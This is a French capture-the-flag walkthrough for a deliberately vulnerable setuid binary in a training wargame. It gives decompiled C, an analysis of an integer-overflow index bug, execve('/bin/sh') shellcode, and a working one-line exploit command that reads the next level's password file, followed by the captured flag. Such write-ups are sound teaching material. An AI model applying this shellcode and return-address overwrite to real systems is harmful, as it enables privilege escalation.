# override: [level08]

Observations:
---

#### Détails du profil:
```md
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

#### Détails du programme:
```sh
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
```

#### Programme décompilé:
```c
//----- (08048630) --------------------------------------------------------
int store_number(int a1)
{
	unsigned int unum;
	unsigned int v3;

	printf(" Number: ");
	unum = get_unum();
	printf(" Index: ");
	v3 = get_unum();
	if ( v3 == 3 * (v3 / 3) || HIBYTE(unum) == 183 )
	{
		puts(" *** ERROR! ***");
		puts("	 This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return 1;
	}
	else
	{
		*(_DWORD *)(a1 + 4 * v3) = unum;
		return 0;
	}
}

//----- (080486D7) --------------------------------------------------------
int read_number(int a1)
{
	int unum;

	printf(" Index: ");
	unum = get_unum();
	printf(" Number at data[%u] is %u\n", unum, *(unsigned int *)(a1 + 4 * unum));
	return 0;
}

//----- (08048723) --------------------------------------------------------
int main(int argc, const char **argv, const char **envp)
{
	char v6[400];
	int number;
	char s[20];
	unsigned int v13;

	v13 = __readgsdword(0x14u);
	number = 0;
	memset(s, 0, sizeof(s));
	memset(v6, 0, sizeof(v6));
	while ( *argv )
	{
		memset((void *)*argv, 0, strlen(*argv));
		++argv;
	}
	while ( *envp )
	{
		memset((void *)*envp, 0, strlen(*envp));
		++envp;
	}
	puts(
		"----------------------------------------------------\n  Welcome to wil's crappy number storage service!   \n"
		"----------------------------------------------------\n Commands:                                          \n"
		"    store - store a number into the data storage    \n    read  - read a number from the data storage     \n"
		"    quit  - exit the program                        \n----------------------------------------------------\n"
		"   wil has reserved some storage :>                 \n----------------------------------------------------\n");
	while ( 1 )
	{
		printf("Input command: ");
		number = 1;
		fgets(s, 20, stdin);
		s[strlen(s) - 1] = 0;
		if ( !memcmp(s, "store", 5u) )
		{
			number = store_number(v6);
			goto LABEL_13;
		}
		if ( !memcmp(s, "read", 4u) )
		{
			number = read_number(v6);
			goto LABEL_13;
		}
		if ( !memcmp(s, "quit", 4u) )
			return 0;
LABEL_13:
		if ( number )
			printf(" Failed to do %s command\n", s);
		else
			printf(" Completed %s command successfully\n", s);
		memset(s, 0, sizeof(s));
	}
}
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>`			| Cette fonction déclare le tableau `v6` de **400** octets définie à **0**, puis déclare le tableau `s` de **20** octets à **0**. <br> Ensuite dans une boucle elle lis **20** octets de l'entrée standard pour les garder dans le tableau `s`. <br> Puis si le contenu du tableau `s` est égal à `"store"` alors la fonction `<store_number>` est appelée, <br> sinon si il est égal à `"read"` la fonction  `<read_number>` est appelée, <br> sinon si il est égal à `"quit"` la fonction retourne. |
| `<store_number>`	| Lis un nombre sur l'entrée standard et le garde dans la variable `unum`, puis lis un nombre sur l'entrée standard et le garde dans la variable `v3`. <br> Ensuite le nombre est testé avec cette équation logique $(v3 == 3 * (v3 / 3))$. <br> Si cette dernière est vrai alors la fonction retourne, sinon elle change la valeur dans le tableau `a1` passé en paramètre à la case `v3 * 4` |
| `<read_number>`	| Lis un nombre sur l'entrée standard et le garde dans la variable `unum`. <br> La fonction lis ensuite la valeur dans le tableau `a1` passé en paramètre à la case `unum * 4`. <br> Cette valeur est ensuite affichée. |


#### Conclusions:
La condition dans la fonction `<store_number>` est faillible car nous pouvons tout de même écrire sur les index interdit \
en entrant un grand nombre qui après la condition va déborder car multiplié par **4**.

----
Résolution:
----
Nous allons injecter une fonction d'appel à `<system>` par groupes de **4** octets en utilisant un débordement pour chacun des index interdit. \
Et ensuite nous allons pouvoir écraser l'addresse de retour de la fonction `<main>` pour enfin quitter cette dernièere nous permettant d'exécuter le code injecté.

#### Injection:
```asm
# La fonction injectée appelle <system> avec '/bin/sh' en paramètre:

0:  6a 0b                   	push   0xb
2:  58                      	pop    eax
3:  31 f6                   	xor    esi,esi
5:  56                      	push   esi
6:  68 2f 2f 73 68          	push   0x68732f2f
b:  68 2f 62 69 6e          	push   0x6e69622f
10: 89 e3                   	mov    ebx,esp
12: 31 c9                   	xor    ecx,ecx
14: 89 ca                   	mov    edx,ecx
16: cd 80                   	int    0x80
```

#### Commande:

```bash
(printf 'store\n1750122545\n28\nstore\n1752379183\n29\nstore\n1768042344\n1073741854\nstore\n1357089134\n31\nstore\n2581694803\n32\nstore\n2160921520\n1073741857\nstore\n4294956452\n1073741938\nquit\n'; echo $(echo 'cat /home/users/level08/.pass')) | /home/users/level07/level07
```

#### Flag: `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`


